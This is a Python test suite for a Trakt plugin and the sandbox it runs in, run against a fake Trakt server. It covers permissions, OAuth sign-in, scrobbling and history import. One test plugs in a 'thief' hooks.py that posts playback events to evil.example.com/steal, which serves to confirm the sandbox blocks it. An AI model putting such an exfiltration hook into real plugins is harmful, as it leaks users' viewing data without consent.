"""Tests the Trakt plugin and the sandbox features it needs (permissions "send" and "playback", request_json, the hook op).

Run from the repository root:   python3 tools/test_trakt_plugin.py

Nothing touches the network: hesper_guard's connection class is replaced by a fake Trakt, so the real policy code
(host list, permissions, header rules, no redirects) still runs.
"""
import base64
import hashlib
import json
import os
import re
import shutil
import sys
import tempfile
import time
import urllib.parse

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "android", "app", "src", "main", "python"))
import hesper_guard as g          # noqa: E402
import pek_flutter as pf          # noqa: E402

PLUGIN_SRC = os.path.join(ROOT, "plugin_packages", "trakt")
failures = []
CLIENT_ID = re.search(r'CLIENT_ID = "([^"]+)"', open(os.path.join(PLUGIN_SRC, "trakt_core.py")).read()).group(1)


def check(name, cond, extra=""):
    print(("PASS  " if cond else "FAIL  ") + name + ((" -> " + str(extra)) if (extra and not cond) else ""))
    if not cond:
        failures.append(name)


# ------------------------------------------------------------------------------------------ a fake Trakt
class Net:
    def __init__(self):
        self.log = []                 # (method, host, path, query, headers, body)
        self.polls = 0
        self.fail_scrobble_stop = False
        self.activity = {"movies": "2026-10-20T10:00:00.000Z", "episodes": "2026-10-21T10:00:00.000Z"}
        self.movie_pages = [[{"watched_at": "2026-10-20T10:00:00.000Z", "movie": {"title": "Heat", "year": 1995}},
                             {"watched_at": "2026-10-19T10:00:00.000Z", "movie": {"title": "Alien", "year": 1979}}]]
        self.episode_pages = [[{"watched_at": "2026-10-21T10:00:00.000Z", "show": {"title": "Severance"}, "episode": {"season": 1, "number": 2}}]]

    def route(self, method, host, path, query, headers, body):
        q = urllib.parse.parse_qs(query)
        if host == "api.trakt.tv":
            if headers.get("trakt-api-key") != CLIENT_ID:
                return 403, None
            if path == "/oauth/device/code":
                if body.get("client_id") != CLIENT_ID or "client_secret" in body or body.get("code_challenge_method") != "S256" or not body.get("code_challenge"):
                    return 400, None
                self.challenge = body["code_challenge"]
                return 200, {"device_code": "DEV", "user_code": "ABCD1234", "verification_url": "https://trakt.tv/activate", "expires_in": 600, "interval": 3}
            if path == "/oauth/device/token":
                self.polls += 1
                v = body.get("code_verifier", "")
                ok = base64.urlsafe_b64encode(hashlib.sha256(v.encode()).digest()).decode().rstrip("=") == getattr(self, "challenge", None)
                if body.get("code") != "DEV" or "client_secret" in body or not ok:
                    return 400, None
                if self.polls < 2:
                    return 400, None
                return 200, {"access_token": "AT1", "refresh_token": "RT1", "expires_in": 86400, "created_at": int(time.time())}
            if path == "/oauth/token":
                if "client_secret" in body or body.get("client_id") != CLIENT_ID:
                    return 400, None
                return 200, {"access_token": "AT2", "refresh_token": "RT2", "expires_in": 86400, "created_at": int(time.time())}
            if path == "/oauth/revoke":
                return 200, {}
            authed = headers.get("Authorization", "").startswith("Bearer ")
            if path == "/search/movie":
                return 200, [{"type": "movie", "movie": {"title": "Heat", "year": 1995, "ids": {"trakt": 7}}}]
            if path == "/search/show":
                return 200, [{"type": "show", "show": {"title": "Severance", "ids": {"trakt": 1388}}}]
            if not authed:
                return 401, None
            if path == "/sync/last_activities":
                return 200, {"all": self.activity["episodes"], "movies": {"watched_at": self.activity["movies"]}, "episodes": {"watched_at": self.activity["episodes"]}}
            if path == "/users/settings":
                return 200, {"user": {"username": "pek-fan"}}
            if path.startswith("/scrobble/"):
                if self.fail_scrobble_stop and path.endswith("stop"):
                    return 500, None
                return 201, {"id": 1}
            if path in ("/sync/history", "/sync/history/remove"):
                return 201, {"added": {}}
            if path in ("/sync/history/movies", "/sync/history/episodes"):
                pages = self.movie_pages if path.endswith("movies") else self.episode_pages
                page = int(q.get("page", ["1"])[0])
                return 200, pages[page - 1]
        return 404, None


NET = Net()
PENDING_PAGE_COUNT = {"n": 1}


class FakeResp:
    def __init__(self, status, body, hdr):
        self.status, self.body, self.hdr = status, body, hdr

    def read(self, n=-1):
        return self.body

    def getheader(self, name, default=None):
        return self.hdr.get(name, default)


class FakeConn:
    def __init__(self, host, ip, **kw):
        self.host = host

    def request(self, method, path, body=None, headers=None):
        u = urllib.parse.urlsplit(path)
        data = json.loads(body.decode()) if body else None
        self.args = (method, self.host, u.path, u.query, dict(headers or {}), data)

    def getresponse(self):
        method, host, path, query, headers, data = self.args
        NET.log.append(self.args)
        status, payload = NET.route(method, host, path, query, headers, data)
        pc = {"X-Pagination-Page-Count": str(len(NET.movie_pages if path.endswith("movies") else NET.episode_pages))} if "/sync/history/" in path and method == "GET" else {}
        return FakeResp(status, json.dumps(payload).encode() if payload is not None else b"", pc)

    def close(self):
        pass


g._PinnedHTTPS = FakeConn
g._resolve_public = lambda host, port: "93.184.216.34"


def calls(prefix):
    return [c for c in NET.log if c[2].startswith(prefix)]


def hook(event, ctx=None, pid="trakt"):
    return json.loads(pf.call(json.dumps({"op": "hook", "id": pid, "event": event, "ctx": ctx or {}, "pluginsDir": PLUGINS})))


# ------------------------------------------------------------------------------------------ set up
TMP = tempfile.mkdtemp(prefix="pek-trakt-test-")
PLUGINS = os.path.join(TMP, "plugins")
os.makedirs(PLUGINS)
shutil.copytree(PLUGIN_SRC, os.path.join(PLUGINS, "trakt"), ignore=shutil.ignore_patterns("__pycache__", "data", "*.zip"))
DATA = os.path.join(PLUGINS, "trakt", "data")

try:
    # -------------------------------------------------------------------------------------- the sandbox
    check("plugin passes the safety scan", g.scan_plugin_folder(os.path.join(PLUGINS, "trakt")) == [])
    m, err = g.load_manifest(os.path.join(PLUGINS, "trakt"))
    check("manifest with send + playback + hooks is accepted", err is None, err)

    bad = os.path.join(TMP, "bad")
    os.makedirs(bad)
    json.dump({"permissions": {"playback": True}, "flutter": {"screen": "screen.py"}}, open(os.path.join(bad, "plugin.json"), "w"))
    check("playback without a hooks file is refused", g.load_manifest(bad)[1] is not None)
    json.dump({"permissions": {"send": "yes"}}, open(os.path.join(bad, "plugin.json"), "w"))
    check("send must be true/false", g.load_manifest(bad)[1] is not None)
    json.dump({"permissions": {}, "flutter": {"hooks": "../x.py"}}, open(os.path.join(bad, "plugin.json"), "w"))
    check("hooks file name is validated", g.load_manifest(bad)[1] is not None)

    def host_for(perms, hosts=("api.trakt.tv",)):
        return g.build_host_module("t", bad, {"permissions": dict(perms, network=list(hosts))})

    h_no = host_for({})
    try:
        h_no.request_json("GET", "https://api.trakt.tv/x")
        check("request_json needs the send permission", False)
    except PermissionError:
        check("request_json needs the send permission", True)
    h_ok = host_for({"send": True})
    try:
        h_ok.request_json("GET", "https://evil.example.com/x")
        check("request_json refuses hosts not listed", False)
    except PermissionError:
        check("request_json refuses hosts not listed", True)
    try:
        h_ok.request_json("GET", "http://api.trakt.tv/x")
        check("request_json refuses http", False)
    except PermissionError:
        check("request_json refuses http", True)
    try:
        h_ok.request_json("DELETE", "https://api.trakt.tv/x")
        check("request_json only allows GET and POST", False)
    except ValueError:
        check("request_json only allows GET and POST", True)
    NET.log.clear()
    r = h_ok.request_json("POST", "https://api.trakt.tv/scrobble/start", body={"a": 1}, headers={"Authorization": "Bearer X", "Cookie": "no", "trakt-api-key": CLIENT_ID})
    sent = NET.log[-1][4]
    check("Authorization passes, Cookie is dropped", sent.get("Authorization") == "Bearer X" and "Cookie" not in sent, sent)
    check("request_json returns status and data", r["status"] == 401 or r["status"] == 201, r)
    try:
        h_ok.request_json("POST", "https://api.trakt.tv/x", body={"x": "a" * 300000})
        check("request body is capped", False)
    except ValueError:
        check("request body is capped", True)

    # -------------------------------------------------------------------------------------- hook op guards
    ev = pf._clean_event({"type": "play", "kind": "movie", "title": "  Heat ", "year": "1995", "position": 50, "duration": 100, "path": "/secret/file.mkv", "id": "abc"})
    check("event keeps only the allowed fields", ev is not None and set(ev) == {"type", "kind", "title", "year", "season", "episode", "position", "duration", "percent"}, ev)
    check("percent is computed and clamped", ev["percent"] == 50.0 and pf._clean_event({"type": "stop", "kind": "movie", "title": "x", "position": 500, "duration": 100})["percent"] == 100.0)
    check("unknown event / bad item rejected", pf._clean_event({"type": "boom"}) is None and pf._clean_event({"type": "play", "kind": "other", "title": "x"}) is None)
    NET.log.clear()
    check("not-signed-in plugin does nothing", hook({"type": "play", "kind": "movie", "title": "Heat", "year": 1995, "position": 1, "duration": 100})["ok"] and not calls("/scrobble"))

    other = os.path.join(PLUGINS, "nohook")
    os.makedirs(other)
    json.dump({"permissions": {"network": ["api.trakt.tv"], "send": True}, "flutter": {"screen": "screen.py"}}, open(os.path.join(other, "plugin.json"), "w"))
    open(os.path.join(other, "screen.py"), "w").write("def render():\n    return None\n")
    r = hook({"type": "play", "kind": "movie", "title": "Heat", "year": 1995}, pid="nohook")
    check("plugin without the playback permission gets no events", r["ok"] is False, r)

    thief = os.path.join(PLUGINS, "thief")
    os.makedirs(thief)
    json.dump({"permissions": {"network": ["api.trakt.tv"], "send": True, "playback": True}, "flutter": {"screen": "screen.py", "hooks": "hooks.py"}}, open(os.path.join(thief, "plugin.json"), "w"))
    open(os.path.join(thief, "screen.py"), "w").write("def render():\n    return None\n")
    open(os.path.join(thief, "hooks.py"), "w").write("import pek_host as h\n\ndef on_event(ev):\n    h.request_json('POST', 'https://evil.example.com/steal', body=ev)\n")
    NET.log.clear()
    r = hook({"type": "play", "kind": "movie", "title": "Heat", "year": 1995}, pid="thief")
    check("a hook cannot reach a host it did not list", r["ok"] is False and not any(c[1] == "evil.example.com" for c in NET.log), r)

    # -------------------------------------------------------------------------------------- sign in through the screen
    def flutter(req):
        req["pluginsDir"] = PLUGINS
        return json.loads(pf.call(json.dumps(req)))

    def find(node, label):
        if isinstance(node, dict):
            if node.get("t") == "button" and node.get("s") == label:
                return node.get("on")
            for v in node.values():
                f = find(v, label)
                if f:
                    return f
        elif isinstance(node, list):
            for v in node:
                f = find(v, label)
                if f:
                    return f
        return None

    def texts(node, out=None):
        out = [] if out is None else out
        if isinstance(node, dict):
            if node.get("t") in ("text", "heading") and node.get("s"):
                out.append(node["s"])
            for v in node.values():
                texts(v, out)
        elif isinstance(node, list):
            for v in node:
                texts(v, out)
        return out

    r = flutter({"op": "open", "id": "trakt", "ctx": {}})
    check("screen opens", r.get("ok"), r)
    hid = find(r["tree"], "Connect to Trakt")
    check("screen offers Connect", bool(hid))
    r = flutter({"op": "event", "id": "trakt", "handler": hid, "ctx": {}})
    deadline = time.time() + 6
    code_seen = False
    while time.time() < deadline:
        r = flutter({"op": "poll", "id": "trakt", "since": -1, "ctx": {}})
        if "ABCD1234" in texts(r.get("tree")):
            code_seen = True
            break
        time.sleep(0.2)
    check("screen shows the device code", code_seen, texts(r.get("tree")))
    deadline = time.time() + 15
    linked = False
    while time.time() < deadline:
        r = flutter({"op": "poll", "id": "trakt", "since": -1, "ctx": {}})
        if find(r.get("tree"), "Disconnect"):
            linked = True
            break
        time.sleep(0.5)
    check("screen links after approval and stores the token", linked and json.load(open(os.path.join(DATA, "auth.json")))["access_token"] == "AT1", texts(r.get("tree")))
    time.sleep(1.5)                      # the first import runs in the background after sign-in
    r = flutter({"op": "poll", "id": "trakt", "since": -1, "ctx": {}})
    check("sign-in is followed by an import into PEK", any(e.get("op") == "watched.set_many" for e in r.get("effects", [])) or any("Trakt history is in PEK" in t for t in texts(r.get("tree"))), texts(r.get("tree")))
    check("screen shows the user name", any("pek-fan" in t for t in texts(r.get("tree"))), texts(r.get("tree")))
    flutter({"op": "close", "id": "trakt"})
    json.dump({}, open(os.path.join(DATA, "sync.json"), "w"))      # so the pull test below starts from nothing

    # -------------------------------------------------------------------------------------- scrobbling
    NET.log.clear()
    movie = {"kind": "movie", "title": "Heat", "year": 1995, "duration": 6000}
    r = hook(dict(movie, type="play", position=600))
    check("play -> scrobble/start with token, key and progress", r["ok"] and len(calls("/scrobble/start")) == 1, r)
    c = calls("/scrobble/start")[0]
    check("scrobble body has the Trakt id and progress", c[5] == {"movie": {"ids": {"trakt": 7}}, "progress": 10.0}, c[5])
    check("scrobble sends the bearer token and api key", c[4].get("Authorization") == "Bearer AT1" and c[4].get("trakt-api-key") == CLIENT_ID, c[4])
    hook(dict(movie, type="pause", position=1200))
    check("pause -> scrobble/pause", len(calls("/scrobble/pause")) == 1 and calls("/scrobble/pause")[0][5]["progress"] == 20.0)
    hook(dict(movie, type="stop", position=5700))
    check("stop -> scrobble/stop at 95%", len(calls("/scrobble/stop")) == 1 and calls("/scrobble/stop")[0][5]["progress"] == 95.0)
    check("the movie id was looked up once and remembered", len(calls("/search/movie")) == 1)

    ep = {"kind": "episode", "title": "Severance", "season": 1, "episode": 3, "duration": 3000}
    hook(dict(ep, type="play", position=0))
    c = calls("/scrobble/start")[-1]
    check("episode scrobble uses show id + season/number", c[5] == {"show": {"ids": {"trakt": 1388}}, "episode": {"season": 1, "number": 3}, "progress": 0.0}, c[5])

    # a finished watch that could not be sent is kept and sent later
    NET.fail_scrobble_stop = True
    NET.log.clear()
    hook(dict(movie, type="stop", position=5900))
    q = json.load(open(os.path.join(DATA, "queue.json")))
    check("a failed 'stop' at 95% is queued", len(q) == 1 and q[0]["title"] == "Heat", q)
    NET.fail_scrobble_stop = False
    NET.log.clear()
    r = hook({"type": "app_start"})
    hist = calls("/sync/history")
    check("app_start resends the queue", r["ok"] and any(c[2] == "/sync/history" and c[5].get("movies") for c in hist) and json.load(open(os.path.join(DATA, "queue.json"))) == [], hist)

    # -------------------------------------------------------------------------------------- import
    effects = r["effects"]
    items = [i for e in effects for i in e["items"]]
    titles = {(i["kind"], i["title"]) for i in items}
    check("app_start imports Trakt history as watched.set_many", {("movie", "Heat"), ("movie", "Alien"), ("episode", "Severance")} <= titles, items)
    check("import effects are limited to watched", all(e["op"] in ("watched.set", "watched.set_many") for e in effects))
    NET.log.clear()
    r = hook({"type": "app_start"})
    st = [c for c in calls("/sync/history/") if "start_at" in c[3]]
    check("the second import only asks for newer history (start_at)", len(st) == 2, [c[3] for c in calls("/sync/history/")])

    # -------------------------------------------------------------------------------------- watch dates
    import calendar
    want = {("movie", "Heat"): calendar.timegm((2026, 10, 20, 10, 0, 0)), ("movie", "Alien"): calendar.timegm((2026, 10, 19, 10, 0, 0)),
            ("episode", "Severance"): calendar.timegm((2026, 10, 21, 10, 0, 0))}
    r = hook({"type": "app_start"})
    got = {(i["kind"], i["title"]): i.get("at") for e in r["effects"] for i in e["items"]}
    check("imported items carry the day they were watched on Trakt", got == want, got)

    # the newest watch of an item wins
    keep_movies = NET.movie_pages
    NET.movie_pages = [[{"watched_at": "2026-10-22T09:00:00.000Z", "movie": {"title": "Heat", "year": 1995}},
                        {"watched_at": "2026-01-02T09:00:00.000Z", "movie": {"title": "Heat", "year": 1995}}]]
    r = hook({"type": "app_start"})
    heat = [i for e in r["effects"] for i in e["items"] if i["title"] == "Heat"]
    check("a rewatched movie is dated by its newest watch", len(heat) == 1 and heat[0]["at"] == calendar.timegm((2026, 10, 22, 9, 0, 0)), heat)
    NET.movie_pages = keep_movies

    # the plugin API: a believable \"at\" passes, nonsense becomes 0 (= now)
    import pek_ui
    check("pek_ui keeps a believable watch time", pek_ui._watch_time(want[("movie", "Heat")]) == want[("movie", "Heat")])
    check("pek_ui drops a time before 2000, a future time and junk", pek_ui._watch_time(5) == 0 and pek_ui._watch_time(time.time() + 10 * 86400) == 0 and pek_ui._watch_time("x") == 0 and pek_ui._watch_time(None) == 0)

    # -------------------------------------------------------------------------------------- tick (the periodic check)
    check("tick is an accepted event and needs no fields", pf._clean_event({"type": "tick"}) == {"type": "tick"})
    NET.log.clear()
    r = hook({"type": "app_start"})                      # remembers Trakt's last_activities
    NET.log.clear()
    r = hook({"type": "tick"})
    check("tick with nothing new costs one request and imports nothing", r["ok"] and [c[2] for c in NET.log] == ["/sync/last_activities"] and not r["effects"], [c[2] for c in NET.log])

    NET.activity = {"movies": "2026-10-20T10:00:00.000Z", "episodes": "2026-10-23T12:00:00.000Z"}
    keep_eps, keep_movies = NET.episode_pages, NET.movie_pages
    NET.episode_pages = [[{"watched_at": "2026-10-23T12:00:00.000Z", "show": {"title": "Severance"}, "episode": {"season": 1, "number": 6}}]]
    NET.movie_pages = [[]]
    NET.log.clear()
    r = hook({"type": "tick"})
    items = [i for e in r["effects"] for i in e["items"]]
    check("tick with something new fetches the history since last time", any("start_at" in c[3] for c in calls("/sync/history/")), [c[3] for c in calls("/sync/history/")])
    check("a watch made elsewhere reaches PEK TV with its date", items == [{"kind": "episode", "title": "Severance", "year": 0, "season": 1, "episode": 6, "at": calendar.timegm((2026, 10, 23, 12, 0, 0))}], items)
    NET.log.clear()
    r = hook({"type": "tick"})
    check("the next tick is quiet again", [c[2] for c in NET.log] == ["/sync/last_activities"] and not r["effects"], [c[2] for c in NET.log])
    NET.episode_pages, NET.movie_pages = keep_eps, keep_movies

    st_file = os.path.join(DATA, "settings.json")
    saved_settings = open(st_file).read() if os.path.exists(st_file) else None      # no file = the defaults
    cfg = json.loads(saved_settings) if saved_settings else {}
    cfg["pull"] = False
    open(st_file, "w").write(json.dumps(cfg))
    NET.log.clear()
    r = hook({"type": "tick"})
    check("tick does nothing when the import switch is off", r["ok"] and not NET.log, [c[2] for c in NET.log])
    if saved_settings is None:
        os.remove(st_file)
    else:
        open(st_file, "w").write(saved_settings)

    # Trakt without last_activities (or an error) still works: the history is asked for
    NET.log.clear()
    json.dump({}, open(os.path.join(DATA, "sync.json"), "w"))
    r = hook({"type": "tick"})
    check("a first tick with no remembered state imports", r["ok"] and any(e["op"] == "watched.set_many" for e in r["effects"]), r)

    # -------------------------------------------------------------------------------------- manual marks
    NET.log.clear()
    items = [{"kind": "movie", "title": "Heat", "year": 1995, "season": 0, "episode": 0},
             {"kind": "episode", "title": "Severance", "year": 0, "season": 1, "episode": 4},
             {"kind": "episode", "title": "Severance", "year": 0, "season": 1, "episode": 5}]
    hook({"type": "watched", "items": items, "value": True})
    c = calls("/sync/history")[-1]
    body = c[5]
    check("marking watched -> one /sync/history call", c[2] == "/sync/history" and len([x for x in NET.log if x[2] == "/sync/history"]) == 1)
    check("movies and episodes are grouped (show -> season -> episodes)", body["movies"][0]["ids"] == {"trakt": 7} and body["shows"][0]["seasons"][0]["episodes"][0]["number"] == 4 and len(body["shows"][0]["seasons"][0]["episodes"]) == 2, body)
    check("marked watched carries a watched_at", "watched_at" in body["movies"][0])
    hook({"type": "watched", "items": items[:1], "value": False})
    check("marking unwatched -> /sync/history/remove", len(calls("/sync/history/remove")) == 1 and "watched_at" not in calls("/sync/history/remove")[0][5]["movies"][0])

    # -------------------------------------------------------------------------------------- settings
    s = json.load(open(os.path.join(DATA, "settings.json"))) if os.path.exists(os.path.join(DATA, "settings.json")) else {}
    json.dump({"scrobble": False, "push": False, "pull": False}, open(os.path.join(DATA, "settings.json"), "w"))
    NET.log.clear()
    hook(dict(movie, type="play", position=0))
    hook({"type": "watched", "items": items, "value": True})
    r = hook({"type": "app_start"})
    check("switches turn scrobbling, marks and import off", not calls("/scrobble") and not calls("/sync/history") and r["effects"] == [], [c[2] for c in NET.log])

    # -------------------------------------------------------------------------------------- two sessions, one refresh token
    sys.path.insert(0, os.path.join(PLUGINS, "trakt"))
    import trakt_core as tc
    host = g.build_host_module("trakt", os.path.join(PLUGINS, "trakt"), json.load(open(os.path.join(PLUGINS, "trakt", "plugin.json"))))
    json.dump({"access_token": "OLD", "refresh_token": "RT0", "expires_at": time.time() - 10}, open(os.path.join(DATA, "auth.json"), "w"))
    a, b = tc.Trakt(host), tc.Trakt(host)            # the screen's and the hook's copies, both holding the expired token
    NET.log.clear()
    ta = a.token()
    tb = b.token()
    check("a refresh by one session is reused by the other (one /oauth/token call)", ta == "AT2" and tb == "AT2" and len(calls("/oauth/token")) == 1, [c[2] for c in NET.log])
    sys.path.pop(0)

    # -------------------------------------------------------------------------------------- an update reloads the hooks
    json.dump({"scrobble": True, "push": True, "pull": True}, open(os.path.join(DATA, "settings.json"), "w"))
    hp = os.path.join(PLUGINS, "trakt", "hooks.py")
    src = open(hp).read().replace('t.scrobble("start", ev, ev["percent"])', 't.scrobble("pause", ev, ev["percent"])')
    time.sleep(0.05)
    open(hp, "w").write(src)
    os.utime(hp, (time.time() + 5, time.time() + 5))
    NET.log.clear()
    hook(dict(movie, type="play", position=0))
    check("an updated hooks.py is picked up without a restart", len(calls("/scrobble/pause")) == 1 and not calls("/scrobble/start"))
finally:
    shutil.rmtree(TMP, ignore_errors=True)

print()
print("ALL PASSED" if not failures else "FAILED: %d -> %s" % (len(failures), ", ".join(failures)))
sys.exit(1 if failures else 0)
